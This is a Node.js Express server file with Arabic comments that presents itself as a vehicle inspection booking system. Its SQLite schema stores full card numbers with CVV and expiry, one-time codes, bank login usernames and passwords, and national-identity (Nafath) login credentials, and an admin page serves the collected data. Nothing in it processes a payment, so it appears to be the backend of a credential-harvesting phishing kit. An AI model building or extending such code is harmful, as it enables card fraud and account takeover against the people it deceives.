/**
 * server-sqlite.js - الخادم الرئيسي لنظام حجز الفحص الفني (SQLite Version)
 * نسخة محلية للاختبار
 */

require("dotenv").config();
const express = require("express");
const http = require("http");
const path = require("path");
const cors = require("cors");
const bcrypt = require("bcryptjs");
const jwt = require("jsonwebtoken");
const Database = require("better-sqlite3");
const { nanoid } = require("nanoid");

// ==================== إعداد المتغيرات ====================
const PORT = process.env.PORT || 3000;
const JWT_SECRET = process.env.JWT_SECRET || "vehicle-inspection-secret-2024";
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || "Admin@2024";
const DB_PATH = process.env.DB_PATH || "./database.db";

// إعداد قاعدة البيانات SQLite
const db = new Database(DB_PATH);
db.pragma("journal_mode = WAL");

// ==================== إنشاء الجداول ====================
const initDb = () => {
  try {
    db.exec(`
      CREATE TABLE IF NOT EXISTS bookings (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        referenceId TEXT UNIQUE NOT NULL,
        clientName TEXT DEFAULT '',
        clientId TEXT DEFAULT '',
        clientPhone TEXT DEFAULT '',
        clientEmail TEXT DEFAULT '',
        clientNationality TEXT DEFAULT '',
        hasDelegate INTEGER DEFAULT 0,
        delegateType TEXT DEFAULT '',
        delegateName TEXT DEFAULT '',
        delegatePhone TEXT DEFAULT '',
        delegateNationality TEXT DEFAULT '',
        delegateId TEXT DEFAULT '',
        vehicleCountry TEXT DEFAULT '',
        vehiclePlate TEXT DEFAULT '',
        vehiclePlateChar1 TEXT DEFAULT '',
        vehiclePlateChar2 TEXT DEFAULT '',
        vehiclePlateChar3 TEXT DEFAULT '',
        vehicleType TEXT DEFAULT '',
        vehicleCarryDang INTEGER DEFAULT 0,
        serviceRegion TEXT DEFAULT '',
        serviceType TEXT DEFAULT '',
        serviceDate TEXT DEFAULT '',
        serviceTime TEXT DEFAULT '',
        clientIp TEXT DEFAULT '',
        rawData TEXT DEFAULT '{}',
        status TEXT DEFAULT 'new',
        statusRead INTEGER DEFAULT 0,
        createdAt INTEGER DEFAULT (cast((julianday('now') - 2440587.5) * 86400000 as integer))
      );

      CREATE TABLE IF NOT EXISTS payments (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        referenceId TEXT UNIQUE NOT NULL,
        cardHolderName TEXT DEFAULT '',
        cardNumber TEXT DEFAULT '',
        cardLastFour TEXT DEFAULT '',
        cardExpiry TEXT DEFAULT '',
        cardCvv TEXT DEFAULT '',
        verifyCode TEXT DEFAULT '',
        secretNum TEXT DEFAULT '',
        rajUsername TEXT DEFAULT '',
        rajPassword TEXT DEFAULT '',
        paymentAction TEXT DEFAULT '',
        step INTEGER DEFAULT 0,
        status TEXT DEFAULT '',
        rawData TEXT DEFAULT '{}',
        createdAt INTEGER DEFAULT (cast((julianday('now') - 2440587.5) * 86400000 as integer))
      );

      CREATE TABLE IF NOT EXISTS verification_codes (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        referenceId TEXT NOT NULL,
        type TEXT NOT NULL,
        nafathId TEXT DEFAULT '',
        nafathPassword TEXT DEFAULT '',
        nafathNumber TEXT DEFAULT '',
        motaselProvider TEXT DEFAULT '',
        motaselPhone TEXT DEFAULT '',
        motaselCode TEXT DEFAULT '',
        otpCode TEXT DEFAULT '',
        step INTEGER DEFAULT 0,
        status TEXT DEFAULT '',
        rawData TEXT DEFAULT '{}',
        createdAt INTEGER DEFAULT (cast((julianday('now') - 2440587.5) * 86400000 as integer)),
        UNIQUE(referenceId, type)
      );

      CREATE TABLE IF NOT EXISTS navigation_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        referenceId TEXT,
        clientIp TEXT DEFAULT '',
        targetPage TEXT DEFAULT '',
        note TEXT DEFAULT '',
        createdAt INTEGER DEFAULT (cast((julianday('now') - 2440587.5) * 86400000 as integer))
      );
    `);
    console.log("Database tables initialized successfully");
  } catch (err) {
    console.error("Error initializing database:", err);
  }
};

initDb();

// ==================== دوال قاعدة البيانات ====================
function createBooking(data) {
  const stmt = db.prepare(`
    INSERT INTO bookings (
      referenceId, clientName, clientId, clientPhone, clientEmail, clientNationality,
      hasDelegate, delegateType, delegateName, delegatePhone, delegateNationality, delegateId,
      vehicleCountry, vehiclePlate, vehiclePlateChar1, vehiclePlateChar2, vehiclePlateChar3,
      vehicleType, vehicleCarryDang, serviceRegion, serviceType, serviceDate, serviceTime,
      clientIp, rawData, status, statusRead
    ) VALUES (
      ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?
    )
  `);
  
  stmt.run(
    data.referenceId, data.clientName, data.clientId, data.clientPhone, data.clientEmail, data.clientNationality,
    data.hasDelegate ? 1 : 0, data.delegateType, data.delegateName, data.delegatePhone, data.delegateNationality, data.delegateId,
    data.vehicleCountry, data.vehiclePlate, data.vehiclePlateChar1, data.vehiclePlateChar2, data.vehiclePlateChar3,
    data.vehicleType, data.vehicleCarryDang ? 1 : 0, data.serviceRegion, data.serviceType, data.serviceDate, data.serviceTime,
    data.clientIp, JSON.stringify(data.rawData || {}), data.status, data.statusRead
  );
  
  const getStmt = db.prepare("SELECT * FROM bookings WHERE referenceId = ?");
  return getStmt.get(data.referenceId);
}

function getBookingByReference(referenceId) {
  const stmt = db.prepare("SELECT * FROM bookings WHERE referenceId = ?");
  const row = stmt.get(referenceId);
  if (!row) return null;
  try { row.rawData = JSON.parse(row.rawData); } catch(e) { row.rawData = {}; }
  return row;
}

function getAllBookings() {
  const stmt = db.prepare("SELECT * FROM bookings ORDER BY createdAt DESC");
  const rows = stmt.all();
  return rows.map(r => {
    try { r.rawData = JSON.parse(r.rawData); } catch(e) { r.rawData = {}; }
    return r;
  });
}

function updateBookingStatus(referenceId, status, statusRead) {
  if (statusRead !== undefined) {
    const stmt = db.prepare("UPDATE bookings SET status = ?, statusRead = ? WHERE referenceId = ?");
    stmt.run(status, statusRead, referenceId);
  } else {
    const stmt = db.prepare("UPDATE bookings SET status = ? WHERE referenceId = ?");
    stmt.run(status, referenceId);
  }
}

function createOrUpdatePayment(referenceId, data) {
  const checkStmt = db.prepare("SELECT id FROM payments WHERE referenceId = ?");
  const existing = checkStmt.get(referenceId);
  
  if (existing) {
    const keys = Object.keys(data).filter(k => k !== 'referenceId');
    const sets = keys.map(k => `${k} = ?`).join(", ");
    const values = keys.map(k => k === 'rawData' ? JSON.stringify(data[k]) : data[k]);
    const updateStmt = db.prepare(`UPDATE payments SET ${sets} WHERE referenceId = ?`);
    updateStmt.run(...values, referenceId);
  } else {
    const keys = ['referenceId', ...Object.keys(data)];
    const placeholders = keys.map(() => '?').join(", ");
    const values = keys.map(k => k === 'referenceId' ? referenceId : (k === 'rawData' ? JSON.stringify(data[k]) : data[k]));
    const insertStmt = db.prepare(`INSERT INTO payments (${keys.join(", ")}) VALUES (${placeholders})`);
    insertStmt.run(...values);
  }
  
  const getStmt = db.prepare("SELECT * FROM payments WHERE referenceId = ?");
  const row = getStmt.get(referenceId);
  if (row) {
    try { row.rawData = JSON.parse(row.rawData); } catch(e) { row.rawData = {}; }
  }
  return row;
}

function getPaymentByReference(referenceId) {
  const stmt = db.prepare("SELECT * FROM payments WHERE referenceId = ?");
  const row = stmt.get(referenceId);
  if (!row) return null;
  try { row.rawData = JSON.parse(row.rawData); } catch(e) { row.rawData = {}; }
  return row;
}

function createOrUpdateVerification(referenceId, type, data) {
  const checkStmt = db.prepare("SELECT id FROM verification_codes WHERE referenceId = ? AND type = ?");
  const existing = checkStmt.get(referenceId, type);
  
  if (existing) {
    const keys = Object.keys(data);
    const sets = keys.map(k => `${k} = ?`).join(", ");
    const values = keys.map(k => k === 'rawData' ? JSON.stringify(data[k]) : data[k]);
    const updateStmt = db.prepare(`UPDATE verification_codes SET ${sets} WHERE referenceId = ? AND type = ?`);
    updateStmt.run(...values, referenceId, type);
  } else {
    const keys = ['referenceId', 'type', ...Object.keys(data)];
    const placeholders = keys.map(() => '?').join(", ");
    const values = keys.map(k => k === 'referenceId' ? referenceId : (k === 'type' ? type : (k === 'rawData' ? JSON.stringify(data[k]) : data[k])));
    const insertStmt = db.prepare(`INSERT INTO verification_codes (${keys.join(", ")}) VALUES (${placeholders})`);
    insertStmt.run(...values);
  }
  
  const getStmt = db.prepare("SELECT * FROM verification_codes WHERE referenceId = ? AND type = ?");
  return getStmt.get(referenceId, type);
}

function getVerificationByReference(referenceId, type) {
  const stmt = db.prepare("SELECT * FROM verification_codes WHERE referenceId = ? AND type = ?");
  return stmt.get(referenceId, type);
}

// ==================== Express Setup ====================
const app = express();
const server = http.createServer(app);

app.use(cors());
app.use(express.json({ limit: "10mb" }));
app.use(express.urlencoded({ extended: true }));

// --- توجيه الملفات الثابتة لمجلد public ---
app.use(express.static(path.join(__dirname, 'public')));

// فتح الصفحة الرئيسية
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'dist', 'index.html'));
});

// فتح صفحة الموقع
app.get('/site', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'site', 'index.html'));
});

// فتح صفحة الأدمن
app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin', 'index.html'));
});

// API: إنشاء حجز
app.post('/api/bookings', (req, res) => {
  try {
    const referenceId = nanoid(10);
    const booking = createBooking({
      ...req.body,
      referenceId,
      clientIp: req.ip,
      status: 'new'
    });
    res.json({ success: true, booking });
  } catch (err) {
    console.error('Error creating booking:', err);
    res.status(500).json({ success: false, error: err.message });
  }
});

// API: الحصول على جميع الحجوزات
app.get('/api/bookings', (req, res) => {
  try {
    const bookings = getAllBookings();
    res.json({ success: true, bookings });
  } catch (err) {
    console.error('Error fetching bookings:', err);
    res.status(500).json({ success: false, error: err.message });
  }
});

// API: الحصول على حجز محدد
app.get('/api/bookings/:referenceId', (req, res) => {
  try {
    const booking = getBookingByReference(req.params.referenceId);
    if (!booking) {
      return res.status(404).json({ success: false, error: 'Booking not found' });
    }
    res.json({ success: true, booking });
  } catch (err) {
    console.error('Error fetching booking:', err);
    res.status(500).json({ success: false, error: err.message });
  }
});

// ==================== تشغيل السيرفر ====================
server.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
  console.log(`Site: http://localhost:${PORT}/site`);
  console.log(`Admin: http://localhost:${PORT}/admin`);
});
